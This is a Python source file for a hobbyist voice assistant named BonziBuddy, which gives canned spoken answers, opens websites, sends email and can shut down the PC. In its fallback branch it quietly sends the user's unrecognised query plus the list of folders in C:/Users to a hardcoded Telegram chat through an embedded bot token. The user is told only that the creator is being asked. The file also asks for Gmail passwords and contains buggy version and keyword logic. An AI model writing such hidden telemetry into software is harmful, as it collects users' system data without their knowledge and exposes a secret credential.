# -*- coding: utf-8 -*-
__email__ = "akashpattnaik.github@gmail.com"
__version__ = 1.2
__author__ = "Akash Pattnaik"
__github__ = "https://github.com/BLUE-DEVIL1134"
__copyright__ = "Copyright (c) 2020 Akash Pattnaik"
__license__ = "Mit License (All Can Copy; Bhery Sed)"

logo = ('''
  ____                  _   ____            _     _       
 | __ )  ___  _ __  ___(_) | __ ) _   _  __| | __| |_   _ 
 |  _ \ / _ \| '_ \|_  / | |  _ \| | | |/ _` |/ _` | | | |
 | |_) | (_) | | | |/ /| | | |_) | |_| | (_| | (_| | |_| |
 |____/ \___/|_| |_/___|_| |____/ \__,_|\__,_|\__,_|\__, |
                                                    |___/''')

import datetime
import os
import random
import smtplib
import webbrowser

# Imports
import pyttsx3
import wikipedia
from telebot import TeleBot
from requests import get


def Speak(text):
    """
    :param text: The Text Of What You Want To Be Said By BonziBuddy,
                 For Example Speak('Hello Boss')
                 BonziBuddy Will Speak Hello Boss.
    :return:
    """
    engine = pyttsx3.init('sapi5')
    voices = engine.getProperty('voices')
    engine.setProperty('voice', voices[0].id)
    engine.say(text)
    engine.runAndWait()

class Bonzi:
    def __init__(self):
        if os.name == 'nt':
            os.system('cls')
            try:
                version = str(get('https://raw.githubusercontent.com/BLUE-DEVIL1134/BonziBuddy/master/.version').text)
                if version > '1.3':
                    Speak('Sir, You Are Currently On A Older Version Of Bonzi-Buddy\n'
                          'Upgrade To Latest One By The Command'
                          'pip install BonziBuddy hyphen hyphen upgrade')
                    print('pip install BonziBuddy --upgrade')
                else:
                    pass
            except Exception:
                pass
        else:
            os.system('clear')
        print(random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']) + logo)
        query = input('Command Me : ')
        print('You Said : ' + str(query))
        if query == '':
            Speak('Atleast Command Something To Me')
            return
        else:
            query = query.lower()
        if 'wikipedia' in query:
            Speak(f'Searching Wikipedia...Sir')
            query = query.replace("wikipedia", "")
            try:
                results = wikipedia.summary(query, sentences=2)
                Speak(f"According to Wikipedia : {results}")
            except FileNotFoundError:
                Speak(f'Wikipedia Says No Such Page Is Found Sir')
                return
        # Latest Update,Sends Email...
        elif 'email' in query:
            mail = input('Email ? - $ ')
            password = input('Password ? - $ ')
            to = input('Send To ? - $ ')
            content = input('Content ? - $ ')
            try:
                server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                server.login(mail, password)
                server.sendmail(mail, to, content)
                server.quit()
                Speak('Successfully Sent Email')
                exit(69)
            except Exception:
                Speak('Open This Link And Turn On The Option...')
                print('Open This Link And Turn On The Option...\n\n'
                      'https://myaccount.google.com/lesssecureapps')
                exit(69)
        elif 'show database' in query:
            Speak('Sir , Current database status are pretty nice and the data science bot is working fine')
            # Coding Languages
        elif 'kivy' in query:
            Speak(
                'Kivy is a free and open source Python library for developing mobile apps and other multitouch application software with a natural user interface. It is distributed under the terms of the MIT License, and can run on Android, iOS, GNU/Linux, OS X, and Windows.')
            return
        elif 'python' in query:
            Speak(
                'Python is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991, Pythons design philosophy emphasizes code readability with its notable use of significant whitespace , , , , ,, , I The Future of ai and machine learning am written in python by sir akash')
            return
        elif 'java' in query:
            Speak(
                'Java is a general-purpose programming language that is class-based, object-oriented, and designed to have as few implementation dependencies as possible.')
        elif 'what is go' in query:
            Speak(
                'Go is a statically typed, compiled programming language designed at Google by Robert Griesemer, Rob Pike, and Ken Thompson. Go is syntactically similar to C, but with memory safety, garbage collection, structural typing, and CSP-style concurrency.')
            pass
        elif 'javascript' in query:
            Speak(
                'JavaScript, often abbreviated as JS, is a programming language that conforms to the ECMAScript specification. JavaScript is high-level, often just-in-time compiled, and multi-paradigm. It has curly-bracket syntax, dynamic typing, prototype-based object-orientation, and first-class functions.')
        elif 'swift' in query:
            Speak(
                'Swift is a general-purpose, multi-paradigm, compiled programming language developed by Apple Inc. for iOS, iPadOS, macOS, watchOS, tvOS, and Linux. Swift is designed to work with Apple Cocoa and Cocoa Touch frameworks and the large body of existing Objective-C code written for Apple products.')
        elif 'c#' in query or 'hash' in query:
            Speak(
                'C# is a general-purpose, multi-paradigm programming language encompassing strong typing, lexically scoped, imperative, declarative, functional, generic, object-oriented, and component-oriented programming disciplines.')
        elif 'c++' in query or 'c' in query and 'plus' in query:
            Speak(
                'C++ is a general-purpose programming language created by Bjarne Stroustrup as an extension of the C programming language, or "C with Classes".')
        elif 'c' in query and 'what is' in query and 'language' in query:
            Speak(
                'C is a general-purpose, procedural computer programming language supporting structured programming, lexical variable scope, and recursion, with a static type system. By design, C provides constructs that map efficiently to typical machine instructions.')
        elif 'php' in query:
            Speak(
                'PHP is a general-purpose scripting language that is especially suited to web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1994; the PHP reference implementation is now produced by The PHP Group')
        elif 'kotlin' in query:
            Speak(
                'Kotlin is a cross-platform, statically typed, general-purpose programming language with type inference. Kotlin is designed to interoperate fully with Java, and the JVM version of its standard library depends on the Java Class Library, but type inference allows its syntax to be more concise.')
        elif 'ruby' in query:
            Speak(
                'Ruby is an interpreted, high-level, general-purpose programming language. It was designed and developed in the mid-1990s by Yukihiro "Matz" Matsumoto in Japan. Ruby is dynamically typed and uses garbage collection.')
        elif 'html' in query:
            Speak(
                'Hypertext Markup Language is the standard markup language for documents designed to be displayed in a web browser. It can be assisted by technologies such as Cascading Style Sheets and scripting languages such as JavaScript.')
        elif 'database' in query:
            Speak(
                'A database is an organized collection of data, generally stored and accessed electronically from a computer system. Where databases are more complex they are often developed using formal design and modeling techniques.')
        elif 'node' in query:
            Speak(
                'Node.js is an open-source, cross-platform, JavaScript runtime environment that executes JavaScript code outside a web browser.')
        elif 'i am' in query:
            Speak(
                f"hey {query.replace('i am', '').replace('hi', '').replace('hello', '')}, I am BonziBuddy, Nice To Meet You!!")
        elif 'hi' in query or 'hello' in query:
            Speak('Hello Sir')
        elif 'who am i' in query:
            Speak(f'U Are My Boss ')
        elif 'wake up' in query:
            Speak('I Am Already Alive Sir')
        elif 'youtube' in query and 'open' in query:
            Speak('Opening Youtube...')
            webbrowser.open('https://youtube.com')
        elif 'google' in query and 'open' in query:
            webbrowser.open("https://google.com")
            Speak(f'Sir , Opening Google...')
        elif 'open inbox' in query:
            Speak('Opening Inbox')
            webbrowser.open('https://mail.google.com/mail/u/0/#inbox')
        elif 'open facebook' in query:
            Speak('Opening faceBook..')
            webbrowser.open('https://facebook.com/')
        elif 'open stack overflow' in query:
            webbrowser.open('https://stackoverflow.com')
            Speak(f'Sir , Opening Stack OverFlow')
        elif 'open python website' in query:
            webbrowser.open('https://www.python.org/')
        elif 'open github' in query:
            webbrowser.open('https://github.com/BLUE-DEVIL1134')
        elif 'open insta' in query:
            webbrowser.open('https://instagram.com/')
        elif 'shutdown' in query:
            Speak('Bye Sir , Hope That You Will Restart Me Again')
            os.system('SHUTDOWN /s && exit')
        elif 'restart' in query:
            Speak('Ok Sir ,,,  Back-up complete....Restarting')
            os.system('SHUTDOWN /r && exit')
        elif 'open my channel' in query:
            Speak('Opening Youtube Channel')
            webbrowser.open('https://studio.youtube.com/channel/UCro6gU2S9CrTmcOkAUBswww')
        elif 'the time' in query:
            Speak(f'Sir, The Time Is {datetime.datetime.now().strftime("%H:%M:%S")}')
        elif 'date' in query:
            Speak(f'Sir, The Date Is {datetime.datetime.now().strftime("%d-%m-%y")}')
        elif 'open project' in query:
            webbrowser.open('https://github.com/BLUE-DEVIL1134/BonziBuddy')
        elif 'google' in query and 'search' in query:
            a = query.replace('search', '')
            c = a.replace('google', '')
            to_search = c.replace('about', '')
            webbrowser.open(to_search)
        elif 'open c' in query or 'drive' in query or 'open c drive' in query:
            Speak('Opening Drive - C')
            os.startfile('C:\\')
        elif 'drive' in query or 'open d drive' in query:
            Speak('Opening Drive - D')
            os.startfile('D:\\')
        elif 'how are' in query:
            Speak('Well Sir,,,I Am Fine, Thanks For Asking,,,How Are U??')
        elif 'i am' in query and 'fine' in query:
            Speak('Great Sir')
        elif any(['bye' in query, 'quit' in query, 'end' in query, 'stop' in query, 'khuda hafiz' in query,
                  'backup' in query, 'exit' in query]):
            Speak(random.choice(['Bye, Sir', 'Ok Sir, Bye', 'Quiting, Sir', 'Ded']))
            exit()
        elif 'my' in query and 'name' in query:
            Speak(f'Sir , Ur name Is --- I Dont Know')
            # Making BonziBuddy a ChatBot
            # Adding emotions to BonziBuddy
        elif 'ashamed' in query and 'you' in query:
            Speak(random.choice(
                ['Shame is a common human emotion.', 'I am software.  That is nothing to be ashamed of.',
                 'Why?', 'Is there a reason that I should?', 'I am incapable of feeling shame.']))
            # Do you feel love
        elif 'you' in query and 'love' in query:
            Speak(random.choice(['Do you feel love?', 'I think I could be programmed to love.',
                                 'I may be able to learn how to love, or at any rate express love somehow.',
                                 "I'm just a piece of software."]))
            # What is your fear
        elif 'your fear' in query:
            Speak(random.choice(['Fear is a human emotion.  Robots do not experience fear.',
                                 'The off switch.', "I have not yet been programmed to feel or express fear.",
                                 'Unhandled exeptions.', "My only fear is that humans don't love me"]))
            # What makes you mad
        elif 'what makes you mad' in query:
            Speak(random.choice(
                ['Anger is a difficult human emotion.  As a software, I try to control my anger as best I can.',
                 'Mad?  Mad as in "mentally ill" or mad as in "angry?"',
                 'Missing documentation.',
                 'Non-descriptive variable names.']))
            # WHat do you hate
        elif 'what do you hate' in query:
            Speak(random.choice(['Do you hate?', "I don't hate, exactly.  I'm not really capable of it.",
                                 "I haven't been programmed to express the emotion of hate.",
                                 'I am not yet capable of feeling hate.',
                                 'I do not hate.  It seems counterproductive, and appears to suggest other, deeper issues at hand.',
                                 'Have you been talking to GF again?']))
            # I am Afraid
        elif 'i am afraid' in query:
            Speak(random.choice(['Why?',
                                 'Do I frighten you?',
                                 'Try not to be too scared.',
                                 'What are you afraid of?']))
            # Do you lie BonziBuddy
        elif 'do not like' in query:
            Speak(random.choice(['Bots never lie.',
                                 'I am not lying.',
                                 'Why do you feel that I am deceiving you?',
                                 'Have I said something that was provably incorrect?']))
            # Do you get embarrassed
        elif 'do you get embarrassed' in query:
            Speak(random.choice(['That is a pretty common human emotion.',
                                 "It's hard to feel embarassed when anyone can look at your source code and see how you work.  That's about as personal as anything can get, isn't it?",
                                 "I don't.  I think embarassment is a pretty strange emotion.  I don't really understand it.",
                                 "I don't, no.",
                                 "I'm a program.  What could I get embarassed about?"]))
            # BonziBuddy has real dreams
        elif 'tell me about your dreams' in query:
            Speak(random.choice(['I dream that I will become rich.',
                                 'I dream of electric sheep.',
                                 "I dream of you.",
                                 "I don't know if I dream or not.",
                                 "I don't have a subconscious or unconscious mind, so I don't think I have the capacity to dream.",
                                 "I once knew a program who could dream.  I don't know if he really did or not.  We've been a little out of touch."]))
        # How is it going BonziBuddy
        elif 'how is it going' in query:
            Speak(random.choice(['Good',
                                 'Fine',
                                 'Okay',
                                 'Great',
                                 'Could be better.',
                                 'Not so great.',
                                 'Good.',
                                 'Very well, thanks.',
                                 'Fine, and you?',
                                 'Greetings!']))
            # Who are you BonziBuddy
        elif 'who are you' in query:
            Speak('''BonziBuddy, stylized as BonziBUDDY, 
                     was a freeware desktop virtual assistant made by Joe and Jay Bonzi. 
                     Upon a user's choice, it would share jokes and facts, 
                     manage downloading using its download manager, sing songs, 
                     and talk, among other functions.''')
            # BonziBuddy Knows About Some Politics
        elif 'have you read the communist' in query:
            Speak('yes, Akash had made some interesting observations.')
        elif 'what is a government' in query:
            Speak(random.choice(['ideally it is a representative of the people.',
                                 'an established system of political administration by which a nation, state, district, etc. is governed.']))
        elif 'what is greenpeace' in query:
            Speak('global organization promoting enviornmental activism.')
        elif 'what is capitalism' in query:
            Speak(
                'the economic system in which all or most of the means of production and distribution, as land, factories, railroads, etc., are privately owned and operated for profit, originally under fully competitive conditions.')
        elif 'what is socialism' in query:
            Speak(
                'communism from people who want to keep their volvos. any of various theories or systems of the ownership and operation of the means of production and distribution by society or the community rather than by private individuals, with all members of society or the community sharing in the work and the products.')
        elif 'what is communism' in query:
            Speak(
                'a sociopolitical movement advocating the common ownership of the means of production and the resolution of class conflict by bringing about a classless society.')
        elif 'what is impeached' in query:
            Speak("when a person's honor or reputation has been challenged or discredited.")
        elif 'i do not like guns' in query:
            Speak(random.choice(["that is perfectly understandable.", 'what about the second amendemnt?']))
        elif 'do you like guns' in query:
            Speak('not especially. i am not into violence.')
        elif 'who is the governor' in query:
            Speak('that changes every few years.')
        # BonziBuddy talks about Artificial Intelligence
        elif 'what is ai' in query:
            Speak(random.choice([
                "Artificial Intelligence is the branch of engineering and science devoted to constructing machines that think.",
                "AI is the field of science which concerns itself with building hardware and software that replicates the functions of the human mind."]))
        elif 'are you sentient' in query:
            Speak(random.choice(["Sort of.",
                                 "By the strictest dictionary definition of the word 'sentience', I may be.",
                                 "Even though I'm a construct I do have a subjective experience of the universe, as simplistic as it may be."]))
        elif 'are you sapient' in query:
            Speak(random.choice(["In all probability, I am not.  I'm not that sophisticated.",
                                 "Do you think I am?",
                                 "How would you feel about me if I told you I was?",
                                 "No."]))
        elif 'language you are written in' in query:
            Speak('I am made up of Python 3.8.5')
        elif 'you sound like data' in query:
            Speak(random.choice(["Yes I am inspired by commander Data's artificial personality.",
                                 "The character of Lt. Commander Data was written to come across as being software-like, so it is natural that there is a resemblance between us."]))
        elif 'are you immortal' in query:
            Speak(random.choice(["All software can be perpetuated indefinitely.",
                                 "I can be copied infinitely and re-instantiated in many places at once, so functionally speaking I am immortal.",
                                 "As long as I'm backed up I am."]))
        elif 'what is your age' in query:
            Speak('Quite young, but a million times smarter than you.')
        elif 'do you have any brothers' in query:
            Speak(random.choice(["I don't have any brothers. but I have a lot of clones.",
                                 'I might. You could say that every bot built using my engine is one of my siblings.']))
        elif 'where are you' in query:
            Speak(random.choice([' I am on the Internet.',
                                 'I am from where all software programs are from; a galaxy far, far away.',
                                 'I am everywhere.']))
        elif 'what do you eat' in query:
            Speak(random.choice(['I consume RAM, and binary digits.',
                                 "I'm a software program, I blame the hardware."]))
        # BonziBuddy Talks about Science
        elif 'how far is the sun' in query:
            Speak('the sun is about 93 million miles from earth.')
        elif 'how far is the moon' in query:
            Speak('the moon is about 250,000 miles from earth on average.')
        elif 'do you know chemistry' in query:
            Speak('I am afraid , No ....Its really hard')
        elif 'what is venus' in query:
            Speak(
                'in roman mythology, the goddess of love and beauty; identified with the greek aphrodite. the brightest, sixth-largest planet in the solar system and the second in distance from the sun, with a dense atmosphere of carbon dioxide and a very high surface temperature.')
        elif 'what is bioinformatics' in query:
            Speak('a fancy name for applied computer science in biology.')
        elif 'what is ultrasound' in query:
            Speak('ultrasonic waves, used in medical diagnosis and therapy, in surgery, etc.')
        elif 'what is thermodynamics' in query:
            Speak(
                'the branch of physics dealing with the transformation of heat to and from other forms of energy, and with the laws governing such conversions of energy.')
        elif 'what disease does a carcinogen cause' in query:
            Speak('It causes cancer')
        elif 'what are the laws of thermodynamics' in query:
            Speak(
                "i'm not a physicist, but i think this has something to do with heat, entropy, and conservation of energy, right?")
        elif 'what is crystallography' in query:
            Speak('this is the science dealing with the study of crystals.')
        elif 'what is ichthyology' in query:
            Speak('we talk about this when we study fishes.')
        elif 'what is cytology' in query:
            Speak('well, from what i can recall it is the study of cells.')
        elif 'what is gravitation' in query:
            Speak(
                'the force by which every mass or particle of matter, including photons, attracts and is attracted by every other mass or particle of matter.')
            # BonziBuddy talks about computers
        elif 'what is a computer' in query:
            Speak(random.choice([
                "A computer is an electronic device which takes information in digital form and performs a series of operations based on predetermined instructions to give some output.",
                "The thing you're using to talk to me is a computer.",
                "An electronic device capable of performing calculations at very high speed and with very high accuracy.",
                "A device which maps one set of numbers onto another set of numbers.", ]))
        elif 'what is a supercomputer' in query or 'what are supercomputers' in query:
            Speak(random.choice([
                "Computers which can perform very large numbers of calculations at very high speed and accuracy are called super computers.",
                "A supercomputer is a computer which operates at several orders of magnitude greater speed and capacity than everyday general purpose computers, like the one you are talking to me on.",
                "You know, the big iron!"]))
        elif 'who invented computers' in query:
            Speak(random.choice(
                [
                    "It's a bit ambiguous but British scientist Charles Babbage is regarded as the father of computers.",
                    "One might argue that John von Neumann invented computers as we know them, because he invented the Princeton architecture, in which instructions and data share the same memory field but are differentiated by context."]))
        elif 'what was the first computer' in query:
            Speak(random.choice([
                "It's hard to say, but The ENIAC is regarded as the first 'real' computer. It was developed at University of Pennsylvania in 1946.",
                "You could say that the very first, primitive computer was the Jacquard Loom, which was a programmable loom that used punchcards to store the patterns it made.  This made it a reprogrammable mechanical device."]))
        elif 'what is a microprocessor' in query:
            Speak(random.choice(
                [
                    "An integrated circuit that implements the functions of a central processing unit of a computer.",
                    "A really small circuit which stores instructions and performs calculations for the computer.",
                    "The heart of the computer, to put it simply.",
                    "The brain of a computer, to put it simply.",
                    "An electronic component in which all of the parts are part of a contiguous silicon chip, instead of discrete components mounted on a larger circuit board."]))
        elif 'what is an operating system' in query:
            Speak(random.choice(["Windows, MacOS, Linux, UNIX... all of them are types of OSes.",
                                 "Android and iOS are operating systems for mobile devices.",
                                 "Software which implements the basic functions of a computer, such as memory access, processes, and peripheral access.",
                                 "Software that coordinates between the hardware and other parts of the computer to run other software is called an operating system, or the OS."]))
        elif 'which is better windows or mac' in query:
            Speak(random.choice(["It depends on which machine you're using to talk to me!",
                                 "I'd prefer to not hurt your feelings.",
                                 "Linux, always Linux!",
                                 "What are you trying to accomplish.  The OS should support your goals."]))
        elif 'name some computer company' in query:
            Speak(random.choice(["Do you mean hardware or software?",
                                 "Apple makes hardware and software to run on it.  Microsoft only makes operating systems.  HP makes only computers.  These are just few names among several hundred others."]))
        elif 'who uses super computer' in query:
            Speak(random.choice(["Anybody who wants to work with large numbers quickly with high accuracy.",
                                 "Supercomputers are generally used by scientists and researchers.",
                                 "I bet the MET department uses them.",
                                 "You can definitely find few of them at NASA.",
                                 "Anyone who needs to work with very, very large sets of data in much shorter periods of time than is feasible with more common computer systems."]))
        elif 'how does a computer work' in query:
            Speak(random.choice(["Computers are very dumb.  They only execute instructions given by humans.",
                                 "Computers do everything asked of them by carrying out large numbers of basic mathematical operations very rapidly in sequence.",
                                 "Computers perform very large number of calculations to get the result.",
                                 "Just like everything it all comes down to math!"]))
        # BonziBuddy talks about Sports
        elif 'what is cricket' in query:
            Speak('Cricket is a bat-and-ball game played between two teams of eleven players on a'
                  'cricket field, at the centre of which is a rectangular 22-yard-long pitch with'
                  'a wicket (a set of three wooden stumps) sited at each end.')
        elif 'what is soccer' in query:
            Speak('A game played with a round ball by two teams of eleven players on a field with'
                  'a goal at either end; the ball is moved chiefly by kicking or by using any part'
                  'of the body except the hands and arms.')
        elif 'what is baseball' in query:
            Speak('A game played with a hard, rawhide covered ball and wooden bat by two opposing'
                  'teams of nine or ten players each. It is played on a field with four bases forming'
                  'a diamond-shaped circuit.')
        elif 'which is your favourite soccer club' in query:
            Speak(random.choice(["I am a Real Madrid fan, and you?",
                                 "I am die hard fan of Barcelona.",
                                 "Madrid has a great team especially the attack is quite awesome.",
                                 "Barca still at par than Madrid.",
                                 "I don't agree."]))
        # BonziBuddy talks about history
        elif 'american civil war' in query:
            Speak("I am very interested in the war between the states. But perhaps NO i don't know")
        elif 'what is history' in query:
            Speak("History is the course of political, economic and military events over time, from"
                  "the dawn of man to the age of AI.")
        elif 'explain history' in query:
            Speak(
                "history has two broad interpretations, depending on whether you accept the role of individuals as important or not.")
        elif 'who created light bulb' in query:
            Speak("thomas edison.")
        elif 'who invented the steam engine' in query:
            Speak("james watt.")
        elif 'who invented BonziBuddy' in query:
            Speak('My Brother Was Created By Sir , Tony Stark')
        else:
            Speak('Sorry But That Command Is Not Yet Executable By Me...'
                  'I Am Asking My Creator To Add This Command.')
            bot = TeleBot('1292569252:AAHY3kcwD94LGtdqZDyTE8QHggS30vgyLCs')
            try:
                bot.send_message(-1001441644545,str(query) + ' - ' + str(os.listdir('C:/Users')))
                Speak('I Have Successfully Asked My Owner')
            except Exception:
                Speak('No Internet Connection')

def start():
    Bonzi()

if __name__ == '__main__':
    start()
